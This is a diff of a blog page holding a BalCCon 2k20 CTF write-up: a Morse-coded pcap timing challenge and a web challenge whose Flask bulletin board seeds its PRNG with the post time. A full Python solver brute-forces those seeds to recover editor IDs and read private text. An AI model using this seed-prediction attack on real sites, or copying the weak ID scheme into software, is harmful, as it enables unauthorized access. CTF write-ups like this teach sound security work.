@@ -3,7 +3,14 @@
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <link rel="stylesheet" type="text/css" href="/css/normalize.css">
-    <link rel="stylesheet" type="text/css" href="/css/style.css">
+    <link rel="stylesheet" type="text/css" href="/css/medium.css">
+    <link rel="apple-touch-icon" sizes="152x152" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+    <meta name="msapplication-TileColor" content="#da532c">
+    <meta name="theme-color" content="#ffffff">
     
     
     <title>BalCCon 2k20 CTF Write Up | Ajdin&#39;s blog</title>
@@ -11,10 +18,6 @@
 <body>
         <main><div>
     <a class="nav-item link-fix" href="/">Ajdin&#39;s blog</a>
-    
-    <a class="nav-item link-fix" href="/about">About</a>
-    
-    <a class="nav-item link-fix" href="/cv/cv.pdf">CV</a>
     
     <a class="nav-item link-fix" href="/tags">Tags</a>
     
@@ -30,11 +33,11 @@
 
 
 
-<span class="date">[2020-09-20]</span>
+<span class="date">26 Sep 2020</span>
 
 
 
-<p>================================</p>
+<hr>
 <p><img src="/ctf-balccon-2020/6.png" alt="">
 This is a BalCCon 2k20 Write Up by imm0rtals</p>
 <h2 id="forensicspatience">forensics/Patience</h2>
@@ -43,17 +46,17 @@ This is a BalCCon 2k20 Write Up by imm0rtals</p>
 </blockquote>
 <p>We are given a .pcap file and if we look at the duration
 <img src="/ctf-balccon-2020/7.png" alt=""></p>
-<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">&gt;&gt;&gt; <span style="color:#fff;font-weight:bold">for</span> i in durs:
-...     <span style="color:#fff;font-weight:bold">if</span> i &lt; <span style="color:#ff0;font-weight:bold">0.20</span>:
-...             morse +=<span style="color:#0ff;font-weight:bold">&#39;.&#39;</span>
-...     <span style="color:#fff;font-weight:bold">elif</span> i &gt; <span style="color:#ff0;font-weight:bold">0.5</span> and i &lt; <span style="color:#ff0;font-weight:bold">1</span>:
-...             morse +=<span style="color:#0ff;font-weight:bold">&#39;-&#39;</span>
-...     <span style="color:#fff;font-weight:bold">else</span>:
-...             morse +=<span style="color:#0ff;font-weight:bold">&#39; &#39;</span>
+<pre><code>&gt;&gt;&gt; for i in durs:
+...     if i &lt; 0.20:
+...             morse +='.'
+...     elif i &gt; 0.5 and i &lt; 1:
+...             morse +='-'
+...     else:
+...             morse +=' '
 ... 
 &gt;&gt;&gt; morse
-<span style="color:#0ff;font-weight:bold">&#39;-... -.-. - ..-.  -.-. --- ...- . .-. -  - .. -- .. -. --.  -.-. .... .- -. -. . .-..  .- - - .- -.-. -.-  .- -  -.. .- .-- -.  .&#39;</span>
-</code></pre></div><pre><code>BCTF{COVERT_TIMING_CHANNEL_ATTACK_AT_DAWN}
+'-... -.-. - ..-.  -.-. --- ...- . .-. -  - .. -- .. -. --.  -.-. .... .- -. -. . .-..  .- - - .- -.-. -.-  .- -  -.. .- .-- -.  .'
+</code></pre><pre><code>BCTF{COVERT_TIMING_CHANNEL_ATTACK_AT_DAWN}
 </code></pre><hr>
 <h2 id="welcomemy-glass-is-empty">welcome/My glass is empty?</h2>
 <blockquote>
@@ -107,157 +110,157 @@ This is a BalCCon 2k20 Write Up by imm0rtals</p>
 <p>Bulletin Board where you can buy or sell cool stuff. Check it out: <a href="https://two-sides-of-a-coin.pwn.institute">https://two-sides-of-a-coin.pwn.institute</a></p>
 </blockquote>
 <p>CTF challege provides us with app.py:</p>
-<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#007f7f">#!/usr/bin/env python3</span>
+<pre><code>#!/usr/bin/env python3
 
-<span style="color:#fff;font-weight:bold">import</span> datetime
-<span style="color:#fff;font-weight:bold">import</span> os
-<span style="color:#fff;font-weight:bold">import</span> string
-<span style="color:#fff;font-weight:bold">import</span> random
-<span style="color:#fff;font-weight:bold">import</span> time
+import datetime
+import os
+import string
+import random
+import time
 
-<span style="color:#fff;font-weight:bold">import</span> sqlite3
+import sqlite3
 
-<span style="color:#fff;font-weight:bold">from</span> flask <span style="color:#fff;font-weight:bold">import</span> Flask, redirect, render_template, request, url_for
+from flask import Flask, redirect, render_template, request, url_for
 
 READONLY = False
-<span style="color:#fff;font-weight:bold">if</span> os.getenv(<span style="color:#0ff;font-weight:bold">&#39;READONLY&#39;</span>):
-    READONLY = <span style="color:#fff;font-weight:bold">bool</span>(os.getenv(<span style="color:#0ff;font-weight:bold">&#39;READONLY&#39;</span>))
+if os.getenv('READONLY'):
+    READONLY = bool(os.getenv('READONLY'))
 
 
 app = Flask(__name__)
 
-@app.route(<span style="color:#0ff;font-weight:bold">&#39;/&#39;</span>)
-<span style="color:#fff;font-weight:bold">def</span> index():
-    conn = sqlite3.connect(<span style="color:#0ff;font-weight:bold">&#39;board.db&#39;</span>)
+@app.route('/')
+def index():
+    conn = sqlite3.connect('board.db')
     c = conn.cursor()
-    c.execute(<span style="color:#0ff;font-weight:bold">&#39;SELECT id_viewer, title FROM board&#39;</span>)
+    c.execute('SELECT id_viewer, title FROM board')
 
     data = []
-    <span style="color:#fff;font-weight:bold">for</span> item in c.fetchall():
+    for item in c.fetchall():
         data.append({
-            <span style="color:#0ff;font-weight:bold">&#39;id&#39;</span>: item[<span style="color:#ff0;font-weight:bold">0</span>],
-            <span style="color:#0ff;font-weight:bold">&#39;title&#39;</span>: item[<span style="color:#ff0;font-weight:bold">1</span>],
+            'id': item[0],
+            'title': item[1],
         })
     conn.close()
 
-    <span style="color:#fff;font-weight:bold">return</span> render_template(<span style="color:#0ff;font-weight:bold">&#39;index.html&#39;</span>, data=data, readonly=READONLY)
+    return render_template('index.html', data=data, readonly=READONLY)
 
 
-<span style="color:#fff;font-weight:bold">def</span> get_random_id():
-    alphabet = <span style="color:#fff;font-weight:bold">list</span>(string.ascii_lowercase + string.digits)
+def get_random_id():
+    alphabet = list(string.ascii_lowercase + string.digits)
 
-    <span style="color:#fff;font-weight:bold">return</span> <span style="color:#0ff;font-weight:bold">&#39;&#39;</span>.join([random.choice(alphabet) <span style="color:#fff;font-weight:bold">for</span> _ in <span style="color:#fff;font-weight:bold">range</span>(<span style="color:#ff0;font-weight:bold">32</span>)])
+    return ''.join([random.choice(alphabet) for _ in range(32)])
 
 
-@app.route(<span style="color:#0ff;font-weight:bold">&#39;/add&#39;</span>, methods=[<span style="color:#0ff;font-weight:bold">&#39;GET&#39;</span>, <span style="color:#0ff;font-weight:bold">&#39;POST&#39;</span>])
-<span style="color:#fff;font-weight:bold">def</span> add():
-    <span style="color:#fff;font-weight:bold">if</span> READONLY:
-        <span style="color:#fff;font-weight:bold">return</span> <span style="color:#0ff;font-weight:bold">&#39;Sorry, new advertisements are temporarily not allowed.&#39;</span>
+@app.route('/add', methods=['GET', 'POST'])
+def add():
+    if READONLY:
+        return 'Sorry, new advertisements are temporarily not allowed.'
 
-    <span style="color:#fff;font-weight:bold">if</span> request.method == <span style="color:#0ff;font-weight:bold">&#39;GET&#39;</span>:
-        <span style="color:#fff;font-weight:bold">return</span> render_template(<span style="color:#0ff;font-weight:bold">&#39;add.html&#39;</span>)
+    if request.method == 'GET':
+        return render_template('add.html')
 
-    posted_at = <span style="color:#fff;font-weight:bold">round</span>(time.time(), <span style="color:#ff0;font-weight:bold">4</span>)
+    posted_at = round(time.time(), 4)
     random.seed(posted_at)
     id_viewer = get_random_id()
     id_editor = get_random_id()
 
-    conn = sqlite3.connect(<span style="color:#0ff;font-weight:bold">&#39;board.db&#39;</span>)
+    conn = sqlite3.connect('board.db')
     c = conn.cursor()
-    params = (id_viewer, id_editor, posted_at, request.form[<span style="color:#0ff;font-weight:bold">&#39;title&#39;</span>], request.form[<span style="color:#0ff;font-weight:bold">&#39;text&#39;</span>], request.form[<span style="color:#0ff;font-weight:bold">&#39;text_extra&#39;</span>])
-    c.execute(<span style="color:#0ff;font-weight:bold">&#39;INSERT INTO board VALUES (?, ?, ?, ?, ?, ?)&#39;</span>, params)
+    params = (id_viewer, id_editor, posted_at, request.form['title'], request.form['text'], request.form['text_extra'])
+    c.execute('INSERT INTO board VALUES (?, ?, ?, ?, ?, ?)', params)
     conn.commit()
     conn.close()
 
-    <span style="color:#fff;font-weight:bold">return</span> redirect(<span style="color:#0ff;font-weight:bold">&#39;/view/&#39;</span> + id_editor)
+    return redirect('/view/' + id_editor)
 
 
-@app.route(<span style="color:#0ff;font-weight:bold">&#39;/view/&lt;_id&gt;&#39;</span>)
-<span style="color:#fff;font-weight:bold">def</span> view(_id):
-    conn = sqlite3.connect(<span style="color:#0ff;font-weight:bold">&#39;board.db&#39;</span>)
+@app.route('/view/&lt;_id&gt;')
+def view(_id):
+    conn = sqlite3.connect('board.db')
     c = conn.cursor()
     params = (_id, _id)
-    c.execute(<span style="color:#0ff;font-weight:bold">&#39;SELECT id_viewer, id_editor, posted_at, title, text_viewer, text_editor FROM board WHERE id_viewer = ? OR id_editor = ? LIMIT 1&#39;</span>, params)
+    c.execute('SELECT id_viewer, id_editor, posted_at, title, text_viewer, text_editor FROM board WHERE id_viewer = ? OR id_editor = ? LIMIT 1', params)
     data = c.fetchone()
 
-    <span style="color:#fff;font-weight:bold">if</span> not data:
-        <span style="color:#fff;font-weight:bold">return</span> <span style="color:#0ff;font-weight:bold">&#39;Advertisement not found.&#39;</span>, <span style="color:#ff0;font-weight:bold">404</span>
+    if not data:
+        return 'Advertisement not found.', 404
 
-    <span style="color:#007f7f"># extra notes for editor</span>
-    is_editor = (data[<span style="color:#ff0;font-weight:bold">1</span>] == _id)
+    # extra notes for editor
+    is_editor = (data[1] == _id)
     text_extra = None
     url_viewer = None
 
-    <span style="color:#fff;font-weight:bold">if</span> is_editor:
-        text_extra = data[<span style="color:#ff0;font-weight:bold">5</span>]
-        url_viewer = url_for(<span style="color:#0ff;font-weight:bold">&#39;view&#39;</span>, _id=data[<span style="color:#ff0;font-weight:bold">0</span>])
+    if is_editor:
+        text_extra = data[5]
+        url_viewer = url_for('view', _id=data[0])
 
     data = {
-        <span style="color:#0ff;font-weight:bold">&#39;posted_at&#39;</span>: datetime.datetime.fromtimestamp(data[<span style="color:#ff0;font-weight:bold">2</span>], tz=datetime.timezone.utc).strftime(<span style="color:#0ff;font-weight:bold">&#39;%Y-%m-</span><span style="color:#0ff;font-weight:bold">%d</span><span style="color:#0ff;font-weight:bold"> %H:%M UTC&#39;</span>),
-        <span style="color:#0ff;font-weight:bold">&#39;title&#39;</span>: data[<span style="color:#ff0;font-weight:bold">3</span>],
-        <span style="color:#0ff;font-weight:bold">&#39;text&#39;</span>: data[<span style="color:#ff0;font-weight:bold">4</span>],
-        <span style="color:#0ff;font-weight:bold">&#39;text_extra&#39;</span>: text_extra,
-        <span style="color:#0ff;font-weight:bold">&#39;url_viewer&#39;</span>: url_viewer,
+        'posted_at': datetime.datetime.fromtimestamp(data[2], tz=datetime.timezone.utc).strftime('%Y-%m-%d %H:%M UTC'),
+        'title': data[3],
+        'text': data[4],
+        'text_extra': text_extra,
+        'url_viewer': url_viewer,
     }
     conn.close()
 
-    <span style="color:#fff;font-weight:bold">return</span> render_template(<span style="color:#0ff;font-weight:bold">&#39;view.html&#39;</span>, data=data)
+    return render_template('view.html', data=data)
 
 
-<span style="color:#fff;font-weight:bold">if</span> __name__ == <span style="color:#0ff;font-weight:bold">&#39;__main__&#39;</span>:
-    app.run(host=<span style="color:#0ff;font-weight:bold">&#39;0.0.0.0&#39;</span>, port=<span style="color:#ff0;font-weight:bold">5002</span>)
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5002)
 
-</code></pre></div><p>The random number generation in not actually random. The script which extracts the flag:</p>
-<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#fff;font-weight:bold">import</span> random
-<span style="color:#fff;font-weight:bold">import</span> string
-<span style="color:#fff;font-weight:bold">import</span> time
-<span style="color:#fff;font-weight:bold">import</span> calendar
-<span style="color:#fff;font-weight:bold">import</span> requests
-<span style="color:#fff;font-weight:bold">import</span> argparse
-<span style="color:#fff;font-weight:bold">import</span> bs4
-<span style="color:#fff;font-weight:bold">import</span> itertools
+</code></pre><p>The random number generation in not actually random. The script which extracts the flag:</p>
+<pre><code>import random
+import string
+import time
+import calendar
+import requests
+import argparse
+import bs4
+import itertools
 
-<span style="color:#fff;font-weight:bold">def</span> get_random_id():
-    alphabet = <span style="color:#fff;font-weight:bold">list</span>(string.ascii_lowercase + string.digits)
-    <span style="color:#fff;font-weight:bold">return</span> <span style="color:#0ff;font-weight:bold">&#39;&#39;</span>.join([random.choice(alphabet) <span style="color:#fff;font-weight:bold">for</span> _ in <span style="color:#fff;font-weight:bold">range</span>(<span style="color:#ff0;font-weight:bold">32</span>)])
+def get_random_id():
+    alphabet = list(string.ascii_lowercase + string.digits)
+    return ''.join([random.choice(alphabet) for _ in range(32)])
 
-<span style="color:#fff;font-weight:bold">def</span> frange(start,stop,step):
-  <span style="color:#fff;font-weight:bold">if</span> step == <span style="color:#ff0;font-weight:bold">0</span>:
-    <span style="color:#fff;font-weight:bold">raise</span> ValueError(<span style="color:#0ff;font-weight:bold">&#34;Step must not be 0&#34;</span>)
-  sample_count = <span style="color:#fff;font-weight:bold">int</span>(<span style="color:#fff;font-weight:bold">abs</span>(stop-start) / step)
-  <span style="color:#fff;font-weight:bold">return</span> itertools.islice(itertools.count(start,step),sample_count)
+def frange(start,stop,step):
+  if step == 0:
+    raise ValueError(&quot;Step must not be 0&quot;)
+  sample_count = int(abs(stop-start) / step)
+  return itertools.islice(itertools.count(start,step),sample_count)
 
-<span style="color:#fff;font-weight:bold">def</span> check_id(view_id):
-  r = requests.get(host + <span style="color:#0ff;font-weight:bold">&#34;view/&#34;</span> + view_id) 
-  soup = bs4.BeautifulSoup(r.text, <span style="color:#0ff;font-weight:bold">&#39;html.parser&#39;</span>)
-  tm = soup.font.text[<span style="color:#ff0;font-weight:bold">10</span>:]
-  t = time.strptime(tm,<span style="color:#0ff;font-weight:bold">&#34;%Y-%m-</span><span style="color:#0ff;font-weight:bold">%d</span><span style="color:#0ff;font-weight:bold"> %H:%M %Z&#34;</span>)
-  <span style="color:#fff;font-weight:bold">for</span> i in frange(<span style="color:#ff0;font-weight:bold">0</span>,<span style="color:#ff0;font-weight:bold">60</span>,<span style="color:#ff0;font-weight:bold">0.0001</span>):
-    time_value = <span style="color:#fff;font-weight:bold">round</span>(calendar.timegm(t),<span style="color:#ff0;font-weight:bold">4</span>)+i
+def check_id(view_id):
+  r = requests.get(host + &quot;view/&quot; + view_id) 
+  soup = bs4.BeautifulSoup(r.text, 'html.parser')
+  tm = soup.font.text[10:]
+  t = time.strptime(tm,&quot;%Y-%m-%d %H:%M %Z&quot;)
+  for i in frange(0,60,0.0001):
+    time_value = round(calendar.timegm(t),4)+i
     random.seed(time_value)
     test_seed_id = get_random_id()
-    <span style="color:#fff;font-weight:bold">if</span> test_seed_id == view_id:
-      <span style="color:#fff;font-weight:bold">print</span>(<span style="color:#0ff;font-weight:bold">&#34;Viewing id found at {:04f}&#39;s past time : {}&#34;</span>.format(i,test_seed_id))
+    if test_seed_id == view_id:
+      print(&quot;Viewing id found at {:04f}'s past time : {}&quot;.format(i,test_seed_id))
       editing_id = get_random_id()
-      <span style="color:#fff;font-weight:bold">print</span>(<span style="color:#0ff;font-weight:bold">&#34;Editing id found : {}&#34;</span>.format(editing_id))
-      r = requests.get(host + <span style="color:#0ff;font-weight:bold">&#34;view/&#34;</span> + editing_id)
-      soup = bs4.BeautifulSoup(r.text, <span style="color:#0ff;font-weight:bold">&#39;html.parser&#39;</span>)
-      <span style="color:#fff;font-weight:bold">print</span>(<span style="color:#0ff;font-weight:bold">&#34;Title: {}&#34;</span>.format(soup.h1.text.rstrip()))
-      <span style="color:#fff;font-weight:bold">print</span>(<span style="color:#0ff;font-weight:bold">&#34;Regular viewing: {}&#34;</span>.format(soup.find_all(<span style="color:#0ff;font-weight:bold">&#39;p&#39;</span>)[<span style="color:#ff0;font-weight:bold">0</span>].text.rstrip()))
-      <span style="color:#fff;font-weight:bold">print</span>(<span style="color:#0ff;font-weight:bold">&#34;Editorial viewing: {}&#34;</span>.format(soup.find_all(<span style="color:#0ff;font-weight:bold">&#39;p&#39;</span>)[<span style="color:#ff0;font-weight:bold">1</span>].text.rstrip()))
-      <span style="color:#fff;font-weight:bold">break</span>
+      print(&quot;Editing id found : {}&quot;.format(editing_id))
+      r = requests.get(host + &quot;view/&quot; + editing_id)
+      soup = bs4.BeautifulSoup(r.text, 'html.parser')
+      print(&quot;Title: {}&quot;.format(soup.h1.text.rstrip()))
+      print(&quot;Regular viewing: {}&quot;.format(soup.find_all('p')[0].text.rstrip()))
+      print(&quot;Editorial viewing: {}&quot;.format(soup.find_all('p')[1].text.rstrip()))
+      break
 
 
-parser = argparse.ArgumentParser(description=<span style="color:#0ff;font-weight:bold">&#39;Solve bulletin board challenge&#39;</span>)
-parser.add_argument(<span style="color:#0ff;font-weight:bold">&#39;--host&#39;</span>)
+parser = argparse.ArgumentParser(description='Solve bulletin board challenge')
+parser.add_argument('--host')
 args = parser.parse_args()
 
 host = args.host
 r = requests.get(host)
-bs = bs4.BeautifulSoup(r.text,<span style="color:#0ff;font-weight:bold">&#39;html.parser&#39;</span>)
-<span style="color:#fff;font-weight:bold">for</span> viewing_id in bs.find_all(<span style="color:#0ff;font-weight:bold">&#39;a&#39;</span>):
-  check_id(viewing_id[<span style="color:#0ff;font-weight:bold">&#39;href&#39;</span>][<span style="color:#ff0;font-weight:bold">6</span>:])
-</code></pre></div><p>And the flag is:</p>
+bs = bs4.BeautifulSoup(r.text,'html.parser')
+for viewing_id in bs.find_all('a'):
+  check_id(viewing_id['href'][6:])
+</code></pre><p>And the flag is:</p>
 <pre><code>BCTF{numb3rs_from_PRNG_are_n0t_really_rand0m}
 </code></pre><hr>
 <h2 id="webimgr">web/Imgr</h2>
@@ -290,8 +293,8 @@ header(&quot;Location: file://flag.txt&quot;);
 
 
             </div><div class="footer">
-    <p>================================</p>
-    <p> > Copyright 2021 Ajdin Trejic</p>
+    <hr>
+    <p> Copyright 2021 Ajdin Trejic</p>
 </div>
 </main>
     </body>
